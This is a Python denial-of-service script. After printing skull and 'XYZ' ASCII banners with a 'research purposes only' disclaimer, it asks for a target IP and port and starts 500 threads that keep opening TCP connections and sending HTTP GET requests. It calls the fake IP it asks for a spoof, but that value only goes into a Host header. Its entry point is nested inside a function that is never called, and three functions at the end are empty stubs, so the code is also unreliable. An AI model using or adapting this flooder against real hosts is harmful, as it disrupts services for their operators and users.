import os
import sys
from subprocess import CompletedProcess
import time
import subprocess
import time
import webbrowser
import re
import socket
import threading 
def dos():
    #####################################################
    GREEN='\033[0;32m'
    YELLOW='\033[0;33m'
    RED='\033[0;31m'
    BLUE="\033[0;34m"
    NC='\033[0m' # No Color
    #####################################################
    # Define the banner
    BANNER = f"""
    {RED}██████████████████████████████████{RED}
    ███{BLUE}                            {RED}███
    ███{BLUE}  ██╗  ██╗██╗   ██╗███████╗ {RED}███
    ███{RED}  ╚██╗██╔╝╚██╗ ██╔╝╚══███╔╝ {RED}███
    ███{GREEN}   ╚███╔╝  ╚████╔╝   ███╔╝  {RED}███
    ███{YELLOW}   ██╔██╗   ╚██╔╝   ███╔╝   {RED}███
    ███{BLUE}  ██╔╝ ██╗   ██║   ███████╗ {RED}███
    ███{RED}  ╚═╝  ╚═╝   ╚═╝   ╚══════╝ {RED}███
    ███{GREEN}                            {RED}███
    {RED}██████████████████████████████████
    {RED}██████████████████████████████████
    {RED}███This tool is meant for :    ███
    {RED}███Research purproses only,and ███
    {RED}███the usage of this tool is   ███
    {RED}███extremely prohibited!!  ☠   ███
    {RED}██████████████████████████████████
    """
    print("""
                       ______
                    .-"      "-.
                   /            \|
                  |              |    
                  |     DOS      |     
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(__/  \__)( |     _.=" <
      (_/"=._"=._ |/     /\     \| _.="_.="\_)
             "=._ (_     ^^     _)"_.="
                 "=\__|IIIIII|__/="
                _.="| \IIIIII/ |"=._
      _     _.="_.="\          /"=._"=._     _
     ( \_.="_.="     `--------`     "=._"=._/ )
      > _.="                            "=._ <
     (_/                                    \_)
       
          """)
    
        
    # Validate the IP address
    def validate_ip_address(prompt):
        while True:
            try:
                ip = input(prompt)
                socket.inet_aton(ip)
                return ip
            except OSError:
                print("Invalid IP address. Try again.")
                

    # Validate the port number
    def validate_port_number(prompt):
        while True:
            try:
                port = input(prompt)
                if not port.isnumeric():
                    raise ValueError
                port = int(port)
                return port
            except ValueError:
                print("Invalid port number. Try again.")

    # Attack function
    def attack(target, port, fake_ip):
        global attack_num
        attack_num = 0
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                attack_num += 1
                print(f"Packets sent => {attack_num}")
                s.close()
            except (OSError, ConnectionRefusedError):
                print("Error sending packet. Retrying...")
                return

    # Main function
    def main():
        target = validate_ip_address("Enter IP address of the target: ")
        fake_ip = validate_ip_address("Enter the fake IP address to spoof: ")
        port = validate_port_number("Enter the port number you want to attack: ")
        threads = []
        for i in range(500):
            thread = threading.Thread(target=attack, args=(target, port, fake_ip))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()

    if __name__ == "__main__":
        main()
        
def f_runlocally():
        pass

def f_banner():
    pass

def f_error():
    pass